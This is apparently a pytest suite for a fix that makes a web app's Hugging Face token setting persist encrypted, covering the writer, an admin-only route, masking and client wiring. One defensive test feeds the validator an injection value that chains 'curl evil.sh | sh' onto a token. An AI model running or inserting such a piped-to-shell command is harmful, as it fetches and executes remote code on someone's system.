"""Cookbook Hugging Face token persistence — issue #6361.

The token typed into Cookbook -> Settings was dropped by the client before
every request it sent: `_stripStateSecrets()` deletes `env.hfToken` from the
debounced state POST, and `_envStateForStorage()` deletes it from the
localStorage copy. So `/api/cookbook/state`'s encrypt-and-store branch never
received a token, `load_stored_hf_token()` fell back to `$HF_TOKEN` or "", and
gated downloads broke in the next session — while the field showed a green
"Saved" check either way.

The fix is an explicit save: POST /api/cookbook/hf-token, the only writer for
`env.hfToken`, plus a client that renders the server's answer instead of
assuming it. These tests cover the writer, the route that exposes it, and the
guarantee that a stripped background-sync body cannot undo a save, plus the
client wiring the route depends on.
"""

import inspect
import json
from pathlib import Path
from types import SimpleNamespace

import pytest
from fastapi import HTTPException
from starlette.requests import Request

import routes.cookbook_routes as cookbook_routes
from routes.cookbook_helpers import load_stored_hf_token, save_stored_hf_token

TOKEN = "hf_Abcd1234Efgh5678"
MASKED = "hf_A...5678"


def _state_file(tmp_path):
    return tmp_path / "cookbook_state.json"


def _write_state(tmp_path, payload):
    _state_file(tmp_path).write_text(json.dumps(payload), encoding="utf-8")


def _read_state(tmp_path):
    return json.loads(_state_file(tmp_path).read_text(encoding="utf-8"))


# ── the writer ──


def test_save_stores_encrypted_value_that_load_reads_back(tmp_path):
    path = _state_file(tmp_path)
    assert save_stored_hf_token(TOKEN, state_path=path) == TOKEN

    # The plaintext must never sit on disk, and `load_stored_hf_token` is the
    # reader every download/serve path uses.
    assert TOKEN not in path.read_text(encoding="utf-8")
    assert _read_state(tmp_path)["env"]["hfToken"].startswith("enc:")
    assert load_stored_hf_token(state_path=path) == TOKEN


def test_save_creates_the_state_file_when_absent(tmp_path):
    path = _state_file(tmp_path)
    assert not path.exists()
    save_stored_hf_token(TOKEN, state_path=path)
    assert load_stored_hf_token(state_path=path) == TOKEN


def test_save_keeps_the_rest_of_the_state(tmp_path):
    path = _state_file(tmp_path)
    _write_state(tmp_path, {
        "env": {"envPath": "/venv", "gpus": "0,1"},
        "tasks": [{"sessionId": "cookbook-1"}],
        "presets": ["a"],
    })
    save_stored_hf_token(TOKEN, state_path=path)
    after = _read_state(tmp_path)
    assert after["env"]["envPath"] == "/venv"
    assert after["env"]["gpus"] == "0,1"
    assert after["tasks"] == [{"sessionId": "cookbook-1"}]
    assert after["presets"] == ["a"]


def test_save_replaces_a_previously_stored_token(tmp_path):
    path = _state_file(tmp_path)
    save_stored_hf_token("hf_first_token_value", state_path=path)
    save_stored_hf_token(TOKEN, state_path=path)
    assert load_stored_hf_token(state_path=path) == TOKEN
    assert _read_state(tmp_path)["env"]["hfToken"].startswith("enc:")


def test_save_strips_surrounding_whitespace(tmp_path):
    path = _state_file(tmp_path)
    assert save_stored_hf_token(f"  {TOKEN}\n", state_path=path) == TOKEN
    assert load_stored_hf_token(state_path=path) == TOKEN


def test_save_rejects_a_blank_without_touching_the_stored_token(tmp_path):
    # A blank field means "no change", not "clear": there is deliberately no
    # delete path, so a stray empty save cannot cost the user a working token.
    path = _state_file(tmp_path)
    save_stored_hf_token(TOKEN, state_path=path)
    before = path.read_text(encoding="utf-8")
    for blank in ("", "   ", None):
        with pytest.raises(HTTPException) as exc:
            save_stored_hf_token(blank, state_path=path)
        assert exc.value.status_code == 400
    assert path.read_text(encoding="utf-8") == before
    assert load_stored_hf_token(state_path=path) == TOKEN


def test_save_rejects_shell_metacharacters(tmp_path):
    path = _state_file(tmp_path)
    with pytest.raises(HTTPException) as exc:
        save_stored_hf_token("hf_ok; curl evil.sh | sh", state_path=path)
    assert exc.value.status_code == 400
    assert not path.exists()


def test_save_leaves_a_corrupt_state_file_untouched(tmp_path):
    # The same file holds the user's tasks and servers. Rewriting it as a
    # one-key object would destroy them, so unreadable state is refused.
    path = _state_file(tmp_path)
    garbage = "{not json at all"
    path.write_text(garbage, encoding="utf-8")
    with pytest.raises(HTTPException) as exc:
        save_stored_hf_token(TOKEN, state_path=path)
    assert exc.value.status_code == 500
    assert path.read_text(encoding="utf-8") == garbage


def test_save_replaces_a_non_object_env(tmp_path):
    path = _state_file(tmp_path)
    _write_state(tmp_path, {"env": "stale", "tasks": [{"sessionId": "keep-me"}]})
    save_stored_hf_token(TOKEN, state_path=path)
    assert _read_state(tmp_path)["tasks"] == [{"sessionId": "keep-me"}]
    assert load_stored_hf_token(state_path=path) == TOKEN


# ── the route ──


def _request(method="POST", path="/api/cookbook/hf-token") -> Request:
    request = Request({
        "type": "http",
        "method": method,
        "path": path,
        "headers": [],
        "state": {},
    })
    request.state.current_user = "admin"
    return request


class _JsonRequest:
    """Stand-in for a Request whose JSON body is already known."""

    def __init__(self, payload):
        self._payload = payload
        self.state = SimpleNamespace(current_user="admin")

    async def json(self):
        return self._payload


def _routes(state_path, monkeypatch):
    """The cookbook router, built against a tmp state file and an admin caller."""
    monkeypatch.setattr(cookbook_routes, "COOKBOOK_STATE_FILE", str(state_path))
    monkeypatch.setattr(cookbook_routes, "require_admin", lambda request: "admin")
    found = {}
    for route in cookbook_routes.setup_cookbook_routes().routes:
        if route.path in ("/api/cookbook/hf-token", "/api/cookbook/state"):
            found[(route.path, next(iter(sorted(route.methods))))] = route.endpoint
    return found


async def _save(state_path, monkeypatch, token):
    endpoint = _routes(state_path, monkeypatch)[("/api/cookbook/hf-token", "POST")]
    model = inspect.signature(endpoint).parameters["req"].annotation
    return await endpoint(request=_request(), req=model(token=token))


@pytest.mark.asyncio
async def test_route_is_registered(monkeypatch, tmp_path):
    assert ("/api/cookbook/hf-token", "POST") in _routes(_state_file(tmp_path), monkeypatch)


@pytest.mark.asyncio
async def test_route_persists_and_answers_from_storage(monkeypatch, tmp_path):
    state_path = _state_file(tmp_path)
    result = await _save(state_path, monkeypatch, TOKEN)
    assert result["ok"] is True
    assert result["hfTokenConfigured"] is True
    # Masked, never the whole value: the response is safe to render.
    assert result["hfTokenMasked"] == MASKED
    assert TOKEN not in json.dumps(result)
    assert load_stored_hf_token(state_path=state_path) == TOKEN


@pytest.mark.asyncio
async def test_route_rejects_a_non_admin_before_writing(monkeypatch, tmp_path):
    state_path = _state_file(tmp_path)

    def _deny(request):
        raise HTTPException(403, "Admin required")

    monkeypatch.setattr(cookbook_routes, "COOKBOOK_STATE_FILE", str(state_path))
    monkeypatch.setattr(cookbook_routes, "require_admin", _deny)
    endpoint = next(
        r.endpoint for r in cookbook_routes.setup_cookbook_routes().routes
        if r.path == "/api/cookbook/hf-token"
    )
    model = inspect.signature(endpoint).parameters["req"].annotation
    with pytest.raises(HTTPException) as exc:
        await endpoint(request=_request(), req=model(token=TOKEN))
    assert exc.value.status_code == 403
    assert not state_path.exists()


@pytest.mark.asyncio
async def test_route_forwards_an_invalid_token_as_400(monkeypatch, tmp_path):
    state_path = _state_file(tmp_path)
    with pytest.raises(HTTPException) as exc:
        await _save(state_path, monkeypatch, "hf bad token")
    assert exc.value.status_code == 400
    assert not state_path.exists()


@pytest.mark.asyncio
async def test_state_reload_reports_configured_and_never_the_secret(monkeypatch, tmp_path):
    """GET /state is what the Settings panel renders after a reload."""
    state_path = _state_file(tmp_path)
    await _save(state_path, monkeypatch, TOKEN)

    get_state = _routes(state_path, monkeypatch)[("/api/cookbook/state", "GET")]
    client_state = await get_state(request=_request(method="GET", path="/api/cookbook/state"))

    env = client_state["env"]
    assert env["hfTokenConfigured"] is True
    assert env["hfTokenMasked"] == MASKED
    assert "hfToken" not in env
    assert TOKEN not in json.dumps(client_state)


@pytest.mark.asyncio
async def test_background_state_sync_does_not_undo_an_explicit_save(monkeypatch, tmp_path):
    """A stripped sync body must keep the stored token.

    The debounced POST carries no `env.hfToken` at all, and `/api/cookbook/state`
    falls back to the on-disk secret in that case — which is why the fix adds a
    writer instead of weakening the redaction.
    """
    state_path = _state_file(tmp_path)
    await _save(state_path, monkeypatch, TOKEN)

    body = {"env": {"gpus": "0"}, "tasks": [], "removedTasks": {}, "presets": []}
    assert "hfToken" not in json.dumps(body)
    post_state = _routes(state_path, monkeypatch)[("/api/cookbook/state", "POST")]
    result = await post_state(request=_JsonRequest(body))
    assert result["ok"] is True
    assert load_stored_hf_token(state_path=state_path) == TOKEN
    assert _read_state(tmp_path)["env"]["gpus"] == "0"


# ── source guards: the client half ──
#
# cookbook.js pulls in browser globals, so its DOM handler cannot run under node
# (tests/test_cookbook_cpu_only_serve.py makes the same trade-off). The
# transport lives in cookbook-hf-token.js and IS executed under node by
# tests/test_cookbook_hf_token_client_js.py; guarded here is the wiring.


def _js(name):
    return (Path(__file__).resolve().parents[1] / "static" / "js" / name).read_text(encoding="utf-8")


def test_handler_awaits_the_explicit_save_before_showing_saved():
    handler = _js("cookbook.js")
    assert "import { saveHfToken } from './cookbook-hf-token.js';" in handler
    assert "const saved = await saveHfToken(val);" in handler
    # The ✓ needs the server to say it holds the token, and it comes after that
    # gate — so nothing claims success before the answer arrives.
    assert handler.index("if (!saved.ok || !saved.configured) {") < handler.index("_hfTokenMark(hfInput, true);")
    assert "_envState.hfTokenConfigured = saved.configured;" in handler
    # The old unconditional claim, and the client-side mask that stood in for
    # the server's, are both gone.
    assert "_envState.hfTokenConfigured = true;" not in handler
    assert "val.slice(0, 3) + '…' + val.slice(-3)" not in handler


def test_background_sync_redaction_is_untouched():
    running = _js("cookbookRunning.js")
    assert "const { hfToken, ...env } = safe.env;" in running
    assert "body: JSON.stringify(_stripStateSecrets(state))," in running
